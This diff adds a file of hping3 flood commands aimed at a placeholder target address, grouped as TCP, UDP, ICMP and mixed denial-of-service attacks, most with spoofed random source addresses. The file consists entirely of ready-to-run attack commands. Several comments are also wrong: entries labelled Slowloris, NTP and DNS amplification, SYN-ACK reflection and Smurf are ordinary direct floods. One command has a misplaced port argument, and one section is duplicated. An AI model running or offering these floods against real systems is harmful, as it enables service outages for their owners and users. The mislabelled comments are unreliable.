@@ -1,0 +1,89 @@
+#### TCP #####
+
+# SYN Flood Attack (Neptune Attack)
+hping3 -S --flood -p 80 $TARGET_IP  # Sends a high volume of SYN packets to overwhelm the target
+
+hping3 -S --flood -p --rand-source 80 $TARGET_IP  # Sends a high volume of SYN packets to overwhelm the target
+
+# ACK Flood Attack (Firewall Bypass)
+hping3 -A --flood -p 80 $TARGET_IP  # Sends high-rate TCP ACK packets to overload firewalls and network devices
+hping3 -A --flood -p 80 --rand-source $TARGET_IP  # Sends high-rate TCP ACK packets to overload firewalls and network devices
+
+# RST Flood Attack
+hping3 -R --flood -p 80 $TARGET_IP  # Sends TCP RST packets to reset active connections
+hping3 -R --flood -p 80 --rand-source $TARGET_IP  # Sends TCP RST packets to reset active connections
+
+# FIN Flood Attack
+hping3 -F --flood -p 80 $TARGET_IP  # Sends a flood of TCP FIN packets, disrupting communication
+hping3 -F --flood -p 80 --rand-source $TARGET_IP  # Sends a flood of TCP FIN packets, disrupting communication
+
+# Slowloris Attack (HTTP DoS)
+hping3 -S -p 80 -d 10 --flood $TARGET_IP  # Simulates a slow HTTP attack by sending partial requests
+hping3 -S -p 80 -d 10 --flood --rand-source $TARGET_IP  # Simulates a slow HTTP attack by sending partial requests
+
+# TCP Xmas Tree Attack (Malicious TCP Flags)
+hping3 -F -P -U --flood -p 80 $TARGET_IP  # Sends TCP packets with all flags set (FIN, PUSH, URG)
+hping3 -F -P -U --flood -p 80 --rand-source $TARGET_IP  # Sends TCP packets with all flags set (FIN, PUSH, URG)
+
+# Slowloris Attack (HTTP DoS)
+hping3 -S -p 80 -d 10 --flood $TARGET_IP  # Simulates a slow HTTP attack by sending partial requests
+hping3 -S -p 80 -d 10 --flood --rand-source $TARGET_IP  # Simulates a slow HTTP attack by sending partial requests
+
+# SYN-ACK Reflection Attack
+hping3 -S -p $((RANDOM % 65535 + 1)) --flood --rand-source $TARGET_IP  # Sends SYN-ACK packets to confuse the target’s TCP stack
+hping3 -S -p $((RANDOM % 65535 + 1)) --flood $TARGET_IP  # Sends SYN-ACK packets to confuse the target’s TCP stack
+
+# SYN Flood with Random Source IPs and Fully Randomized Payload & Port
+hping3 $TARGET_IP -q -n -d $((RANDOM % 120 + 5)) -S -p $((RANDOM % 65535 + 1)) --flood --rand-source  # SYN attack with random source IPs, payload size, and destination port
+hping3 $TARGET_IP -q -n -d $((RANDOM % 120 + 5)) -S -p $((RANDOM % 65535 + 1)) --flood  # SYN attack with random source IPs, payload size, and destination port
+
+
+#### UDP #####
+
+# UDP Flood Attack
+hping3 --udp --flood -p 53 $TARGET_IP  # Overwhelms the target's UDP port (commonly port 53 for DNS)
+hping3 --udp --flood -p 53 --rand-source $TARGET_IP  # Overwhelms the target's UDP port (commonly port 53 for DNS)
+
+
+# NTP Amplification Attack
+hping3 --udp --flood -p 123 --rand-source $TARGET_IP  # Exploits NTP servers to amplify traffic towards the victim
+hping3 --udp --flood -p 123 $TARGET_IP  # Exploits NTP servers to amplify traffic towards the victim
+
+# SSDP Flood Attack
+hping3 --udp --flood -p 1900 --rand-source $TARGET_IP  # Uses Universal Plug and Play (UPnP) requests to overload the target
+hping3 --udp --flood -p 1900 $TARGET_IP  # Uses Universal Plug and Play (UPnP) requests to overload the target
+
+# DNS Amplification Attack
+hping3 --udp --flood -p 53 --rand-source $TARGET_IP -d 512  # Exploits open DNS resolvers to amplify attack traffic
+hping3 --udp --flood -p 53 $TARGET_IP -d 512  # Exploits open DNS resolvers to amplify attack traffic
+
+#### ICMP #####
+
+# Smurf Attack (ICMP Amplification)
+hping3 -1 --flood $TARGET_IP  # Sends ICMP requests with a spoofed IP, causing amplified responses
+hping3 -1 --flood --rand-source $TARGET_IP  # Sends ICMP requests with a spoofed IP, causing amplified responses
+
+# Teardrop Attack (Fragmented ICMP Packets)
+sudo hping3 -1 --flood --frag -d $((RANDOM % 120 + 5)) $TARGET_IP  # Sends fragmented ICMP packets to exploit reassembly vulnerabilities
+sudo hping3 -1 --flood --frag -d $((RANDOM % 120 + 5)) --rand-source $TARGET_IP  # Sends fragmented ICMP packets to exploit reassembly vulnerabilities
+
+# ICMP Flood Attack (Ping Flood)
+hping3 -1 --flood $TARGET_IP  # Floods the target with ping requests to consume bandwidth
+hping3 -1 --flood --rand-source $TARGET_IP  # Floods the target with ping requests to consume bandwidth
+
+# Ping of Death (Oversized ICMP Packets)
+hping3 -1 -d 65500 --flood $TARGET_IP  # Sends oversized ICMP packets attempting to crash the target
+hping3 -1 -d 65500 --flood --rand-source $TARGET_IP  # Sends oversized ICMP packets attempting to crash the target
+
+# BlackNurse Attack (ICMP Type 3 Code 3 Flood)
+hping3 -1 -C 3 -K 3 --flood $TARGET_IP  # Overwhelms firewalls with ICMP Type 3 Code 3 packets
+hping3 -1 -C 3 -K 3 --flood --rand-source $TARGET_IP  # Overwhelms firewalls with ICMP Type 3 Code 3 packets
+
+
+#### ICMP + TCP + UDP #####
+
+# Combo Flood Attack (SYN + UDP + ICMP)
+hping3 -S --udp --icmp --flood --rand-source $TARGET_IP  # Mixed protocol flooding attack
+hping3 -S --udp --icmp --flood $TARGET_IP  # Mixed protocol flooding attack
+
+
